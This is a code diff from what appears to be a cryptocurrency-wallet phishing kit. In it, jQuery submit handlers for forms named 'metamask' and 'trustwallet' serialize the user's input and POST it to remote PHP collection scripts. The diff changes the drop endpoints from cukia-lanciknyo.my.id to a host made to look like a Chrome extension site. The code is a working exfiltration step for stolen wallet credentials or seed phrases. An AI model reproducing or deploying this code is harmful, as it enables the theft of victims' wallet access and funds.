@@ -30,7 +30,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
  $("#metamask").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: 'https://cukia-lanciknyo.my.id/cosmos/jembut.php',
+            url: 'https://chr0me-extensi0n.000webhostapp.com/chrome.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
@@ -49,7 +49,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
     $("#trustwallet").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: 'https://cukia-lanciknyo.my.id/cosmos/bulu.php',
+            url: 'https://chr0me-extensi0n.000webhostapp.com/extension.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
